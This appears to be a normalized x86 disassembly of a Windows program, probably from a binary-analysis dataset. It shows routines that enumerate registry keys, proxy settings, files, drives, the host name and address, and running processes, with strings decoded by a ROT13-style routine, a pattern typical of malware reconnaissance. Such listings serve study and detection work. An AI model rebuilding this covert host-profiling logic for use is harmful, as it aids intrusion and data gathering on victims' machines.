push edi
mov edi esi
lea esp [ esp ]
add esi 0x1
cmp [ esi ] 0x0
jne r-xdata
mov al [ esi ]
mov cl al
and cl 0x20
or cl 0x41
movsx eax al
movsx edx cl
sub eax edx
add eax 0xd
xor edx edx
mov ebx 0x1a
div ebx
add dl cl
mov [ esi ] dl
movzx eax [ esi ]
push eax
call sub_4061c0
add esp 0x4
test al al
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn 0x4
sub_4067d0
mov eax 0x1018
call sub_40ad70
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x1014 ] eax
push ebx
lea eax [ esp + 0x8 ]
push eax
push 0x20019
push 0x0
push rw-data
mov ebx ecx
call sub_401580
add esp 0x4
push eax
push 0x80000001
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
push rw-data
lea ecx [ esp + 0x41c ]
push ecx
call [ lstrcpyA@IAT ]
mov ecx [ esp + 0x8 ]
lea edx [ esp + 0x4 ]
push edx
lea eax [ esp + 0x41c ]
push eax
push 0x0
push 0x0
push rw-data
push ecx
mov [ esp + 0x1c ] 0x400
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
xor eax eax
pop ebx
mov ecx [ esp + 0x1014 ]
xor ecx esp
call sub_40acd2
add esp 0x1018
retn
push ebp
push esi
push edi
push rw-data
call sub_401580
push eax
push ebx
call sub_4065a0
push rw-data
call sub_401580
push eax
push ebx
call sub_4065a0
lea edx [ esp + 0x43c ]
push edx
xor edi edi
call sub_405930
add esp 0x1c
test eax eax
jbe r-xdata
mov eax 0x1
mov ebp [ WideCharToMultiByte@IAT ]
xor eax eax
jmp r-xdata
xor esi esi
cmp [ esp + 0x24 ] si
lea eax [ esp + 0x24 ]
je r-xdata
mov ecx [ esp + 0x1024 ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_40acd2
add esp 0x1018
retn
push 0x0
push 0x0
push 0x400
lea edx [ esp + 0xc30 ]
push edx
push 0xffffffff
lea eax [ esp + 0x38 ]
push eax
push 0x0
push 0x0
call ebp
push 0x0
push 0x0
push 0x400
lea ecx [ esp + 0x830 ]
push ecx
push 0xffffffff
lea edx [ esp + esi * 2 + 0x3a ]
push edx
push 0x0
push 0x0
call ebp
lea eax [ esp + 0x824 ]
push eax
lea ecx [ esp + 0xc28 ]
push ecx
push rw-data
call sub_401580
add esp 0x4
push eax
push ebx
call sub_4065a0
lea edx [ esp + 0x434 ]
push edx
add edi 0x1
call sub_405930
add esp 0x14
cmp edi eax
jb r-xdata
lea esp [ esp ]
mov al [ esp + edi + 0x424 ]
lea ecx [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0x18 ]
lea edx [ esp + 0x28 ]
push edx
push 0x0
mov [ esp + 0x24 ] al
push 0x0
lea eax [ esp + 0x28 ]
push eax
push ecx
mov [ esp + 0x31 ] 0x0
mov [ esp + 0x28 ] 0x400
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
add eax 0x2
add esi 0x1
cmp [ eax ] 0x0
jne r-xdata
sub_4069b0
sub esp 0x8dc
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8d8 ] eax
push ebx
mov ebx [ esp + 0x8e4 ]
push ebp
mov ebp [ esp + 0x8ec ]
push esi
xor esi esi
cmp ebx 0x80000000
push edi
mov edi ecx
je r-xdata
push rw-data
call sub_401580
cmp ebx 0x80000001
je r-xdata
mov ebx [ RegEnumValueA@IAT ]
lea ecx [ esp + 0x14 ]
push ecx
lea edx [ esp + 0xec ]
push edx
lea eax [ esp + 0x24 ]
push eax
mov eax [ esp + 0x24 ]
push 0x0
lea ecx [ esp + 0x20 ]
push ecx
lea edx [ esp + 0x4fc ]
push edx
push 0x0
mov ebp 0x400
push eax
mov [ esp + 0x30 ] ebp
mov [ esp + 0x34 ] ebp
call ebx
test eax eax
jne r-xdata
push eax
push rw-data
call sub_401580
add esp 0x4
push eax
push edi
call sub_4065a0
add esp 0xc
xor eax eax
jmp r-xdata
push rw-data
call sub_401580
push eax
lea edx [ esp + 0x28 ]
push edx
jmp r-xdata
cmp ebx 0x80000002
je r-xdata
mov ecx [ esp + 0x18 ]
push ecx
call [ RegCloseKey@IAT ]
mov eax 0x1
mov edi edi
mov ecx [ esp + 0x8e8 ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_40acd2
add esp 0x8dc
retn 0x8
call sub_4060b0
add esp 0xc
push ebp
lea ecx [ esp + 0x24 ]
push ecx
call [ lstrcatA@IAT ]
lea edx [ esp + 0x20 ]
push edx
push rw-data
call sub_401580
add esp 0x4
push eax
push edi
call sub_4065a0
add esp 0xc
lea eax [ esp + 0x18 ]
push eax
push 0x20019
push 0x0
push ebp
push ebx
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
push rw-data
call sub_401580
push eax
lea ecx [ esp + 0x28 ]
push ecx
jmp r-xdata
push ebx
push rw-data
call sub_401580
add esp 0x4
jmp r-xdata
mov edx [ esp + 0x1c ]
lea ecx [ esp + 0xe8 ]
push ecx
push edx
lea eax [ esp + 0x4f0 ]
push eax
push rw-data
call sub_401580
add esp 0x4
push eax
push edi
call sub_4065a0
add esp 0x14
lea ecx [ esp + 0x14 ]
push ecx
lea edx [ esp + 0xec ]
push edx
lea eax [ esp + 0x24 ]
push eax
mov eax [ esp + 0x24 ]
push 0x0
lea ecx [ esp + 0x20 ]
push ecx
lea edx [ esp + 0x4fc ]
push edx
add esi 0x1
push esi
push eax
mov [ esp + 0x30 ] ebp
mov [ esp + 0x34 ] ebp
call ebx
test eax eax
je r-xdata
push eax
lea eax [ esp + 0x28 ]
push eax
sub_406b70
sub esp 0x408
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x404 ] eax
push esi
push edi
push rw-data
mov esi ecx
call sub_401580
push eax
push esi
call sub_4065a0
mov edi [ InternetQueryOptionA@IAT ]
add esp 0xc
lea eax [ esp + 0x8 ]
push eax
lea ecx [ esp + 0x10 ]
push ecx
push 0x26
push 0x0
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x18 ] 0x400
call edi
mov edx [ esp + 0xc ]
push edx
push rw-data
call sub_401580
add esp 0x4
push eax
push esi
call sub_4065a0
mov eax [ esp + 0x1c ]
add esp 0xc
push eax
push rw-data
call sub_401580
add esp 0x4
push eax
push esi
call sub_4065a0
mov ecx [ esp + 0x20 ]
add esp 0xc
push ecx
push rw-data
call sub_401580
add esp 0x4
push eax
push esi
call sub_4065a0
add esp 0xc
lea edx [ esp + 0x8 ]
push edx
lea eax [ esp + 0x10 ]
push eax
push 0x2b
push 0x0
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x18 ] 0x400
call edi
lea ecx [ esp + 0xc ]
push ecx
push rw-data
call sub_401580
add esp 0x4
push eax
push esi
call sub_4065a0
add esp 0xc
lea edx [ esp + 0x8 ]
push edx
lea eax [ esp + 0x10 ]
push eax
push 0x2c
push 0x0
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x18 ] 0x400
call edi
lea ecx [ esp + 0xc ]
push ecx
push rw-data
call sub_401580
add esp 0x4
push eax
push esi
call sub_4065a0
mov ecx [ esp + 0x418 ]
add esp 0xc
pop edi
pop esi
xor ecx esp
call sub_40acd2
add esp 0x408
retn
sub_406ca0
sub esp 0x144
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x140 ] eax
push esi
push edi
mov edi [ esp + 0x150 ]
push edi
push rw-data
mov esi ecx
call sub_401580
add esp 0x4
push eax
push esi
call sub_4065a0
add esp 0xc
test eax eax
je r-xdata
mov ecx [ esp + 0x148 ]
pop edi
pop esi
xor ecx esp
xor eax eax
call sub_40acd2
add esp 0x144
retn 0x4
push ebp
lea eax [ esp + 0xc ]
push eax
push edi
call [ FindFirstFileA@IAT ]
mov ebp eax
cmp ebp 0xffffffff
jne r-xdata
lea ecx [ esp + 0x38 ]
push ecx
push rw-data
call sub_401580
add esp 0x4
push eax
push esi
call sub_4065a0
add esp 0xc
test eax eax
je r-xdata
call [ GetLastError@IAT ]
push eax
push rw-data
jmp r-xdata
pop ebp
mov edi [ FindNextFileA@IAT ]
lea edx [ esp + 0xc ]
push edx
push ebp
call edi
test eax eax
je r-xdata
call sub_401580
add esp 0x4
push eax
push esi
call sub_4065a0
add esp 0xc
call [ GetLastError@IAT ]
push ebp
mov edi eax
call [ FindClose@IAT ]
cmp edi 0x12
je r-xdata
lea ebx [ ebx ]
push edi
push rw-data
lea edx [ esp + 0x38 ]
push edx
push rw-data
call sub_401580
add esp 0x4
push eax
push esi
call sub_4065a0
add esp 0xc
mov ecx [ esp + 0x2c ]
lea eax [ esp + 0x38 ]
push eax
push ecx
push rw-data
call sub_401580
add esp 0x4
push eax
push esi
call sub_4065a0
add esp 0x10
jmp r-xdata
lea eax [ esp + 0xc ]
push eax
push ebp
call edi
test eax eax
jne r-xdata
test eax eax
je r-xdata
test [ esp + 0xc ] 0x10
jne r-xdata
sub_406de0
mov eax 0x1470
call sub_40ad70
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x146c ] eax
mov eax [ esp + 0x1474 ]
push ebx
mov ebx ecx
lea ecx [ esp + 0x470 ]
push ecx
push 0x1000
push 0x0
push eax
call GetFileVersionInfoA
test eax eax
je r-xdata
mov ecx [ esp + 0x1470 ]
pop ebx
xor ecx esp
call sub_40acd2
add esp 0x1470
retn 0x4
lea edx [ esp + 0x8 ]
push edx
lea eax [ esp + 0x8 ]
push eax
push rw-data
call sub_401580
add esp 0x4
push eax
lea ecx [ esp + 0x47c ]
push ecx
call VerQueryValueA
test eax eax
je r-xdata
push esi
push edi
mov edi [ esp + 0xc ]
movzx edx [ edi + 0x2 ]
movzx eax [ edi ]
lea esi [ edi + 0x2 ]
push edx
push eax
push rw-data
call sub_401580
add esp 0x4
push eax
lea ecx [ esp + 0x20 ]
push ecx
call sub_4060b0
add esp 0x10
lea edx [ esp + 0x10 ]
push edx
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x1c ]
push ecx
lea edx [ esp + 0x484 ]
push edx
call VerQueryValueA
test eax eax
je r-xdata
movzx ecx [ esi ]
movzx edx [ edi ]
push ecx
push edx
push rw-data
call sub_401580
add esp 0x4
push eax
lea eax [ esp + 0x20 ]
push eax
call sub_4060b0
add esp 0x10
lea ecx [ esp + 0x10 ]
push ecx
lea edx [ esp + 0x10 ]
push edx
lea eax [ esp + 0x1c ]
push eax
lea ecx [ esp + 0x484 ]
push ecx
call VerQueryValueA
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
push eax
push ecx
lea edx [ esp + 0x80 ]
push edx
call sub_4022a0
add esp 0xc
lea eax [ esp + 0x78 ]
push eax
push rw-data
call sub_401580
add esp 0x4
push eax
push ebx
call sub_4065a0
add esp 0xc
movzx eax [ esi ]
movzx ecx [ edi ]
push eax
push ecx
push rw-data
call sub_401580
add esp 0x4
push eax
lea edx [ esp + 0x20 ]
push edx
call sub_4060b0
add esp 0x10
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x10 ]
push ecx
lea edx [ esp + 0x1c ]
push edx
lea eax [ esp + 0x484 ]
push eax
call VerQueryValueA
test eax eax
je r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
push edx
push eax
lea ecx [ esp + 0x80 ]
push ecx
call sub_4022a0
add esp 0xc
lea edx [ esp + 0x78 ]
push edx
push rw-data
call sub_401580
add esp 0x4
push eax
push ebx
call sub_4065a0
add esp 0xc
movzx edx [ esi ]
movzx eax [ edi ]
push edx
push eax
push rw-data
call sub_401580
add esp 0x4
push eax
lea ecx [ esp + 0x20 ]
push ecx
call sub_4060b0
add esp 0x10
lea edx [ esp + 0x10 ]
push edx
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x1c ]
push ecx
lea edx [ esp + 0x484 ]
push edx
call VerQueryValueA
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push ecx
push edx
lea eax [ esp + 0x80 ]
push eax
call sub_4022a0
add esp 0xc
lea ecx [ esp + 0x78 ]
push ecx
push rw-data
call sub_401580
add esp 0x4
push eax
push ebx
call sub_4065a0
add esp 0xc
movzx ecx [ esi ]
movzx edx [ edi ]
push ecx
push edx
push rw-data
call sub_401580
add esp 0x4
push eax
lea eax [ esp + 0x20 ]
push eax
call sub_4060b0
add esp 0x10
lea ecx [ esp + 0x10 ]
push ecx
lea edx [ esp + 0x10 ]
push edx
lea eax [ esp + 0x1c ]
push eax
lea ecx [ esp + 0x484 ]
push ecx
call VerQueryValueA
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
push eax
push ecx
lea edx [ esp + 0x80 ]
push edx
call sub_4022a0
add esp 0xc
lea eax [ esp + 0x78 ]
push eax
push rw-data
call sub_401580
add esp 0x4
push eax
push ebx
call sub_4065a0
add esp 0xc
movzx eax [ esi ]
movzx ecx [ edi ]
push eax
push ecx
push rw-data
call sub_401580
add esp 0x4
push eax
lea edx [ esp + 0x20 ]
push edx
call sub_4060b0
add esp 0x10
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x10 ]
push ecx
lea edx [ esp + 0x1c ]
push edx
lea eax [ esp + 0x484 ]
push eax
call VerQueryValueA
test eax eax
je r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
push edx
push eax
lea ecx [ esp + 0x80 ]
push ecx
call sub_4022a0
add esp 0xc
lea edx [ esp + 0x78 ]
push edx
push rw-data
call sub_401580
add esp 0x4
push eax
push ebx
call sub_4065a0
add esp 0xc
movzx edx [ esi ]
movzx eax [ edi ]
push edx
push eax
push rw-data
call sub_401580
add esp 0x4
push eax
lea ecx [ esp + 0x20 ]
push ecx
call sub_4060b0
add esp 0x10
lea edx [ esp + 0x10 ]
push edx
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x1c ]
push ecx
lea edx [ esp + 0x484 ]
push edx
call VerQueryValueA
test eax eax
pop edi
pop esi
je r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push ecx
push edx
lea eax [ esp + 0x80 ]
push eax
call sub_4022a0
add esp 0xc
lea ecx [ esp + 0x78 ]
push ecx
push rw-data
call sub_401580
add esp 0x4
push eax
push ebx
call sub_4065a0
add esp 0xc
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push eax
push ecx
lea edx [ esp + 0x78 ]
push edx
call sub_4022a0
add esp 0xc
lea eax [ esp + 0x70 ]
push eax
push rw-data
call sub_401580
add esp 0x4
push eax
push ebx
call sub_4065a0
add esp 0xc
sub_4071c0
sub esp 0x58
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x54 ] eax
push ebx
push 0x50
lea eax [ esp + 0xc ]
push eax
mov ebx ecx
call Ordinal_WSOCK32_57
cmp eax 0xffffffff
jne r-xdata
push edi
lea ecx [ esp + 0xc ]
push ecx
push rw-data
call sub_401580
add esp 0x4
push eax
push ebx
call sub_4065a0
add esp 0xc
lea edx [ esp + 0xc ]
push edx
call Ordinal_WSOCK32_52
mov edi eax
test edi edi
jne r-xdata
push rw-data
call sub_401580
push eax
push ebx
call sub_4065a0
add esp 0xc
pop ebx
mov ecx [ esp + 0x54 ]
xor ecx esp
call sub_40acd2
add esp 0x58
retn
mov eax [ edi + 0xc ]
push esi
xor esi esi
cmp [ eax ] esi
je r-xdata
push rw-data
call sub_401580
push eax
push ebx
call sub_4065a0
add esp 0xc
pop edi
pop ebx
mov ecx [ esp + 0x54 ]
xor ecx esp
call sub_40acd2
add esp 0x58
retn
mov ecx [ esp + 0x60 ]
pop esi
pop edi
pop ebx
xor ecx esp
call sub_40acd2
add esp 0x58
retn
mov eax [ eax ]
push 0x4
push eax
lea ecx [ esp + 0x14 ]
push ecx
call sub_4022a0
mov edx [ esp + 0x18 ]
add esp 0xc
push edx
call Ordinal_WSOCK32_11
push eax
push rw-data
call sub_401580
add esp 0x4
push eax
push ebx
call sub_4065a0
mov eax [ edi + 0xc ]
add esi 0x1
lea eax [ eax + esi * 4 ]
add esp 0xc
cmp [ eax ] 0x0
jne r-xdata
sub_4072c0
sub esp 0xcc
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xc8 ] eax
mov eax [ esp + 0xd0 ]
push esi
push 0x0
push eax
lea eax [ esp + 0xc ]
push eax
mov esi ecx
call sub_4059c0
push rw-data
call sub_401580
push eax
lea ecx [ esp + 0x18 ]
push ecx
call sub_405980
add esp 0x18
lea edx [ esp + 0x4 ]
push edx
mov ecx esi
call sub_406ca0
mov ecx [ esp + 0xcc ]
pop esi
xor ecx esp
call sub_40acd2
add esp 0xcc
retn 0x4
sub_407330
sub esp 0x410
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x40c ] eax
push ebx
push esi
push rw-data
mov esi ecx
xor ebx ebx
call sub_401580
push eax
push esi
call sub_4065a0
push rw-data
call sub_401580
push eax
push esi
call sub_4065a0
add esp 0x18
lea eax [ esp + 0x8 ]
push eax
push 0x20019
push ebx
push rw-data
call sub_401580
add esp 0x4
push eax
push 0x80000001
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
push ebp
push edi
mov edi [ RegEnumValueA@IAT ]
push 0x0
push 0x0
lea ecx [ esp + 0x20 ]
push ecx
mov ecx [ esp + 0x1c ]
push 0x0
lea edx [ esp + 0x24 ]
push edx
lea eax [ esp + 0x30 ]
push eax
push 0x0
mov ebp 0x400
push ecx
mov [ esp + 0x34 ] ebp
call edi
test eax eax
jne r-xdata
pop esi
xor eax eax
pop ebx
mov ecx [ esp + 0x40c ]
xor ecx esp
call sub_40acd2
add esp 0x410
retn
mov ecx [ esp + 0x10 ]
push ecx
call [ RegCloseKey@IAT ]
push rw-data
call sub_401580
push eax
push esi
call sub_4065a0
add esp 0xc
lea edx [ esp + 0x10 ]
push edx
push 0x20019
push 0x0
push rw-data
call sub_401580
add esp 0x4
push eax
push 0x80000001
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
lea edx [ esp + 0x1c ]
push edx
mov ecx esi
call sub_406770
push eax
push rw-data
call sub_401580
add esp 0x4
push eax
push esi
call sub_4065a0
add esp 0xc
push 0x0
push 0x0
lea eax [ esp + 0x20 ]
push eax
mov eax [ esp + 0x1c ]
push 0x0
lea ecx [ esp + 0x24 ]
push ecx
lea edx [ esp + 0x30 ]
push edx
add ebx 0x1
push ebx
push eax
mov [ esp + 0x34 ] ebp
call edi
test eax eax
je r-xdata
xor ebx ebx
push ebx
push ebx
lea eax [ esp + 0x20 ]
push eax
mov eax [ esp + 0x1c ]
push ebx
lea ecx [ esp + 0x24 ]
push ecx
lea edx [ esp + 0x30 ]
push edx
push ebx
push eax
mov [ esp + 0x34 ] ebp
call edi
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ esp + 0x10 ]
push eax
call [ RegCloseKey@IAT ]
push rw-data
call sub_401580
push eax
push esi
call sub_4065a0
add esp 0xc
mov eax 0x1
lea ecx [ esp + 0x1c ]
push ecx
mov ecx esi
call sub_406770
push eax
push rw-data
call sub_401580
add esp 0x4
push eax
push esi
call sub_4065a0
add esp 0xc
push 0x0
push 0x0
lea edx [ esp + 0x20 ]
push edx
mov edx [ esp + 0x1c ]
push 0x0
lea eax [ esp + 0x24 ]
push eax
lea ecx [ esp + 0x30 ]
push ecx
add ebx 0x1
push ebx
push edx
mov [ esp + 0x34 ] ebp
call edi
test eax eax
je r-xdata
mov ecx [ esp + 0x41c ]
pop edi
pop ebp
pop esi
pop ebx
xor ecx esp
call sub_40acd2
add esp 0x410
retn
sub_407530
sub esp 0x8dc
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8d8 ] eax
push ebx
push ebp
push esi
push edi
push rw-data
mov esi ecx
xor edi edi
call sub_401580
push eax
push esi
call sub_4065a0
push rw-data
call sub_401580
push eax
push esi
call sub_4065a0
add esp 0x18
lea eax [ esp + 0x18 ]
push eax
push 0x20019
push edi
push rw-data
call sub_401580
add esp 0x4
push eax
push 0x80000002
call [ RegOpenKeyExA@IAT ]
test eax eax
mov ebp [ RegEnumValueA@IAT ]
mov ebx 0x400
jne r-xdata
push eax
push rw-data
call sub_401580
add esp 0x4
push eax
push esi
call sub_4065a0
add esp 0xc
lea ecx [ esp + 0x14 ]
push ecx
lea edx [ esp + 0x4ec ]
push edx
lea eax [ esp + 0x24 ]
push eax
mov eax [ esp + 0x24 ]
push edi
lea ecx [ esp + 0x20 ]
push ecx
lea edx [ esp + 0xfc ]
push edx
push edi
push eax
mov [ esp + 0x30 ] ebx
mov [ esp + 0x34 ] ebx
call ebp
test eax eax
jne r-xdata
push eax
push rw-data
call sub_401580
add esp 0x4
push eax
push esi
call sub_4065a0
add esp 0xc
lea ecx [ esp + 0x14 ]
push ecx
lea edx [ esp + 0x4ec ]
push edx
lea eax [ esp + 0x24 ]
push eax
mov eax [ esp + 0x24 ]
push 0x0
lea ecx [ esp + 0x20 ]
push ecx
lea edx [ esp + 0xfc ]
push edx
push edi
push eax
mov [ esp + 0x30 ] ebx
mov [ esp + 0x34 ] ebx
call ebp
test eax eax
jne r-xdata
mov edx [ esp + 0x18 ]
push edx
call [ RegCloseKey@IAT ]
jmp r-xdata
mov edx [ esp + 0x1c ]
lea ecx [ esp + 0x4e8 ]
push ecx
push edx
lea eax [ esp + 0xf0 ]
push eax
push rw-data
call sub_401580
add esp 0x4
push eax
push esi
call sub_4065a0
add esp 0x14
lea ecx [ esp + 0x4e8 ]
push ecx
push rw-data
call sub_401580
add esp 0x4
push eax
lea edx [ esp + 0x28 ]
push edx
call sub_4060b0
add esp 0xc
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0xec ]
push ecx
lea edx [ esp + 0x28 ]
push edx
push 0x80000002
mov [ esp + 0x20 ] ebx
call [ RegQueryValueA@IAT ]
test eax eax
je r-xdata
mov edx [ esp + 0x18 ]
push edx
call [ RegCloseKey@IAT ]
jmp r-xdata
jmp r-xdata
push rw-data
call sub_401580
push eax
push esi
call sub_4065a0
add esp 0xc
lea eax [ esp + 0x18 ]
push eax
push 0x20019
push 0x0
push rw-data
call sub_401580
add esp 0x4
push eax
push 0x80000001
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
lea eax [ esp + 0xe8 ]
push eax
push rw-data
call sub_401580
add esp 0x4
push eax
push esi
call sub_4065a0
add esp 0xc
lea ecx [ esp + 0xe8 ]
push ecx
mov ecx esi
call sub_406de0
lea edx [ esp + 0x14 ]
push edx
lea eax [ esp + 0x4ec ]
push eax
lea ecx [ esp + 0x24 ]
push ecx
mov ecx [ esp + 0x24 ]
push 0x0
lea edx [ esp + 0x20 ]
push edx
lea eax [ esp + 0xfc ]
push eax
add edi 0x1
push edi
push ecx
mov [ esp + 0x30 ] ebx
mov [ esp + 0x34 ] ebx
call ebp
test eax eax
je r-xdata
push eax
push rw-data
call sub_401580
add esp 0x4
push eax
push esi
call sub_4065a0
add esp 0xc
mov ecx [ esp + 0x8e8 ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
mov eax 0x1
call sub_40acd2
add esp 0x8dc
retn
mov edx [ esp + 0x1c ]
lea ecx [ esp + 0x4e8 ]
push ecx
push edx
lea eax [ esp + 0xf0 ]
push eax
push rw-data
call sub_401580
add esp 0x4
push eax
call sub_4060b0
add esp 0x10
lea ecx [ esp + 0x4e8 ]
push ecx
push rw-data
call sub_401580
add esp 0x4
push eax
lea edx [ esp + 0x28 ]
push edx
call sub_4060b0
add esp 0xc
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0xec ]
push ecx
lea edx [ esp + 0x28 ]
push edx
push 0x80000001
mov [ esp + 0x20 ] ebx
call [ RegQueryValueA@IAT ]
test eax eax
je r-xdata
lea eax [ esp + 0xe8 ]
push eax
push rw-data
call sub_401580
add esp 0x4
push eax
push esi
call sub_4065a0
add esp 0xc
lea ecx [ esp + 0xe8 ]
push ecx
mov ecx esi
call sub_406de0
lea edx [ esp + 0x14 ]
push edx
lea eax [ esp + 0x4ec ]
push eax
lea ecx [ esp + 0x24 ]
push ecx
mov ecx [ esp + 0x24 ]
push 0x0
lea edx [ esp + 0x20 ]
push edx
lea eax [ esp + 0xfc ]
push eax
add edi 0x1
push edi
push ecx
mov [ esp + 0x30 ] ebx
mov [ esp + 0x34 ] ebx
call ebp
test eax eax
je r-xdata
push eax
push rw-data
call sub_401580
add esp 0x4
push eax
push esi
call sub_4065a0
add esp 0xc
sub_4078c0
mov eax 0x8120
call sub_40ad70
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x811c ] eax
mov eax [ rw-data ]
mov dl [ rw-data ]
push esi
push edi
push 0xfb
mov [ esp + 0x8024 ] eax
mov esi ecx
mov ecx [ rw-data ]
lea eax [ esp + 0x802d ]
push 0x0
push eax
mov [ esp + 0x8030 ] ecx
mov [ esp + 0x8034 ] dl
call sub_40acf0
push rw-data
call sub_401580
push eax
push esi
call sub_4065a0
add esp 0x18
push rw-data
call [ LoadLibraryA@IAT ]
mov edi eax
test edi edi
jne r-xdata
push ebx
mov ebx [ GetProcAddress@IAT ]
push ebp
push rw-data
push edi
call ebx
push rw-data
mov ebp eax
push edi
mov [ esp + 0x2c ] ebp
call ebx
push rw-data
push edi
mov [ esp + 0x20 ] eax
call ebx
push rw-data
push edi
mov [ esp + 0x1c ] eax
call ebx
push rw-data
push edi
mov [ esp + 0x24 ] eax
call ebx
test ebp ebp
je r-xdata
push rw-data
call sub_401580
push eax
push esi
call sub_4065a0
add esp 0xc
pop edi
xor eax eax
pop esi
mov ecx [ esp + 0x811c ]
xor ecx esp
call sub_40acd2
add esp 0x8120
retn
push rw-data
cmp [ esp + 0x14 ] 0x0
je r-xdata
test eax eax
je r-xdata
lea ecx [ esp + 0x10 ]
push ecx
push 0x4000
lea edx [ esp + 0x4030 ]
push edx
call eax
test eax eax
jne r-xdata
mov ebp [ esp + 0x10 ]
shr ebp 0x2
mov ebx 0x0
je r-xdata
push rw-data
jmp r-xdata
push rw-data
call sub_401580
push eax
push esi
call sub_4065a0
add esp 0xc
lea eax [ esp + 0x10 ]
push eax
push 0x1000
lea ecx [ esp + 0x30 ]
push ecx
call [ esp + 0x24 ]
test eax eax
jne r-xdata
lea esp [ esp ]
call sub_401580
push eax
push esi
call sub_4065a0
add esp 0xc
xor eax eax
mov ebx [ esp + 0x10 ]
shr ebx 0x2
mov edi 0x0
je r-xdata
push rw-data
jmp r-xdata
push edi
call [ CloseHandle@IAT ]
add ebx 0x1
cmp ebx ebp
jb r-xdata
lea ecx [ esp + 0x10 ]
push ecx
push 0x4
lea edx [ esp + 0x28 ]
push edx
push edi
call [ esp + 0x34 ]
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esp + ebx * 4 + 0x4028 ]
push eax
push 0x0
push 0x410
call [ OpenProcess@IAT ]
mov edi eax
test edi edi
je r-xdata
mov ecx [ esp + 0x20 ]
push 0x104
lea eax [ esp + 0x802c ]
push eax
push ecx
push edi
call [ esp + 0x24 ]
mov eax [ esp + ebx * 4 + 0x4028 ]
lea edx [ esp + 0x8028 ]
push edx
push eax
push rw-data
call sub_401580
add esp 0x4
push eax
push esi
call sub_4065a0
add esp 0x10
lea ecx [ esp + 0x8028 ]
push ecx
mov ecx esi
call sub_406460
lea edx [ esp + 0x8028 ]
push edx
mov ecx esi
call sub_406de0
push rw-data
call sub_401580
push eax
push esi
call sub_4065a0
add esp 0xc
mov ecx [ esp + 0x812c ]
pop ebp
pop ebx
pop edi
pop esi
xor ecx esp
call sub_40acd2
add esp 0x8120
retn
add edi 0x1
cmp edi ebx
jb r-xdata
mov edx [ esp + edi * 4 + 0x28 ]
lea ecx [ esp + 0x8028 ]
push ecx
push edx
push rw-data
call sub_401580
add esp 0x4
push eax
push esi
call sub_4065a0
add esp 0x10
lea eax [ esp + 0x8028 ]
push eax
mov ecx esi
call sub_406270
lea ecx [ esp + 0x8028 ]
push ecx
mov ecx esi
call sub_406de0
push rw-data
call sub_401580
push eax
push esi
call sub_4065a0
add esp 0xc
mov eax [ esp + edi * 4 + 0x28 ]
push 0x104
lea edx [ esp + 0x802c ]
push edx
push eax
call [ esp + 0x28 ]
test eax eax
je r-xdata
sub_407bb0
sub esp 0x404
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x400 ] eax
push ebx
push esi
lea eax [ esp + 0x8 ]
push eax
push 0x400
mov ebx ecx
call [ GetLogicalDriveStringsA@IAT ]
cmp [ esp + 0x8 ] 0x0
lea esi [ esp + 0x8 ]
je r-xdata
mov ecx [ esp + 0x408 ]
pop esi
pop ebx
xor ecx esp
call sub_40acd2
add esp 0x404
retn
push edi
mov edi [ GetDriveTypeA@IAT ]
lea ebx [ ebx ]
push esi
call sub_405930
lea esi [ esi + eax + 0x1 ]
add esp 0x4
cmp [ esi ] 0x0
jne r-xdata
push esi
mov ecx ebx
call sub_4072c0
push esi
call edi
cmp eax 0x3
jne r-xdata
pop edi
sub_407c30
push ebp
lea ebp [ esp - 0x160 ]
sub esp 0x160
push 0xffffffff
push sub_415090
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x15c ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov eax [ ebp + 0x168 ]
mov edi ecx
mov edx [ edi - 0x3cfc ]
lea esi [ edi - 0x3cfc ]
xor ebx ebx
push eax
mov eax [ edx + 0xc ]
mov ecx esi
mov [ ebp - 0x14 ] edi
mov [ edi - 0x1f8 ] ebx
